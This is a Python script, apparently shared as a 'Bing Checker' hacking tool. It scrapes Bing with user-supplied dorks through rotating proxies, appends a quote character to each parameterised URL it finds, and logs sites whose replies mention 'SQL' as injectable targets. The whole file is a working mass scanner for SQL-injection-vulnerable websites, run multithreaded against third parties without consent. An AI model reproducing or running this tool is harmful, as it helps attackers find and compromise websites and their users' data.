import requests, re, sys, os, time, threading, random;from re import search
dorks = [];proxies = []; good, cpm1, cpm2, error = 0,0,0,0; blacklisted = []; links = []
title = """   __               __      \n |/  | /           /  | / / \n |___|   ___  ___ (   |(_/_ \n |   )| |   )|   )|   ) /  )\n |__/ | |  / |__/ |__/ /  / \n             __/            """
def load_dorks():
    dorks.clear()
    try: after = open('dorks.txt', 'r', encoding='utf-8').readlines()
    except: print(' Please add your dorks to \'dorks.txt\'.'); time.sleep(1); return
    for each in after: each = each.replace('\n', '').replace(' ', '%20'); dorks.append(each)
    print(' Loaded {} dorks.'.format(str(len(dorks)))); time.sleep(1)
def load_proxies():
    proxies.clear()
    try: after = open('proxies.txt', 'r', encoding='utf-8').readlines()
    except: print(' Please add your proxies to \'proxies.txt\'.'); time.sleep(1); return
    for each in after: each = each.replace('\n', '').replace(' ', '%20'); proxies.append(each)
    print(' Loaded {} proxies.'.format(str(len(proxies)))); time.sleep(1)
def bing(dork):
    try:
        if len(proxies) > 0: proxytest = random.choice(proxies); proxy = {'http': f'http://{proxytest}', 'https': f'https://{proxytest}'} 
        else: proxy = None
        global good,cpm1,cpm2,error; headers = {'Host': 'www.bing.com', 'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document', 'Referer': 'https://www.bing.com/search?q={}'.format(dork), 'Accept-Language': 'en-US,en;q=0.9', 'Cookie': '_EDGE_V=1; MUID=368260F09689603E2A116E1D97CD618B; SRCHD=AF=NOFORM; SRCHUID=V=2&GUID=66579843BA8843DA9DC26F768F920245&dmnchg=1; MUIDB=368260F09689603E2A116E1D97CD618B; _HPVN=CS=eyJQbiI6eyJDbiI6MSwiU3QiOjAsIlFzIjowLCJQcm9kIjoiUCJ9LCJTYyI6eyJDbiI6MSwiU3QiOjAsIlFzIjowLCJQcm9kIjoiSCJ9LCJReiI6eyJDbiI6MSwiU3QiOjAsIlFzIjowLCJQcm9kIjoiVCJ9LCJBcCI6dHJ1ZSwiTXV0ZSI6dHJ1ZSwiTGFkIjoiMjAyMC0wNy0yMFQwMDowMDowMFoiLCJJb3RkIjowLCJEZnQiOm51bGwsIk12cyI6MCwiRmx0IjowLCJJbXAiOjJ9; MSCC=1; _SS=SID=11A3FF827468607610B7F08F755A613A; SRCHUSR=DOB=20200629&T=1595234764000; ipv6=hit=1595238366326&t=4; _EDGE_S=mkt=en-en&SID=11A3FF827468607610B7F08F755A613A; SRCHHPGUSR=HV=1595234831&WTS=63730831564&CW=1920&CH=969&DPR=1&UTC=180&DM=0'};url = "https://www.bing.com/search?q={0}&qs=n&form=QBRE&sp=-1&pq={0}i&sc=8-5&sk=&cvid=E995B5B4376D4A2D841846D5F4C3505".format(dork);r = requests.get(url, headers=headers, proxies=proxy); all_links = re.findall('<li class="b_algo"><h2><a href="(.*?)" h=', str(r.text))
        for each in all_links: 
            if each.split('://')[1].split('/')[0] in links: return
            if each.split('://')[1].split('/')[0] in blacklisted: return
            if '?' in each or '=' in each: 
                try:
                    r = requests.get(each + " '", proxies=proxy)
                    if 'SQL' in r.text: links.append(each.split('://')[1].split('/')[0]);good+=1;cpm1+=1;print(' [+] - {}'.format(each)); open('links.txt', 'a+').write(each + '\n')
                except: error+=1; threading.Thread(target=bing, args=(dork,)).start()
            else: return
    except: error+=1; threading.Thread(target=bing, args=(dork,)).start()
def start():
    num = 0
    while True:
        if threading.active_count() < 50:
            if len(dorks) > num: threading.Thread(target=bing, args=(dorks[num],)).start(); num+=1
            else: break
    print('Checked all.'); time.sleep(2); input('ENTER to close.'); sys.exit()
def add_blacklist(arg): blacklisted.append(arg)
def menu():
    os.system('cls'); os.system('title Bing Checker - By ExtremeDev'); print(title + '\n\n');print(' Choose where you want to go.\n [1] Load dorks ({})\n [2] Load Proxies ({})\n [3] Add Blacklist ({})\n [4] Start The Bing'.format(str(len(dorks)), str(len(proxies)), str(len(blacklisted))))
    try: alegere = int(input(' > '))
    except: print(" Please enter a valid input."); time.sleep(1); menu()
    if alegere == 1: load_dorks(); menu()
    elif alegere == 2: load_proxies(); menu()
    elif alegere == 3: arg = input(' Website to blacklist\n > '); add_blacklist(arg); menu()
    elif alegere == 4: start()
    else: print(' Invalid input.'); time.sleep(2); menu()
menu()
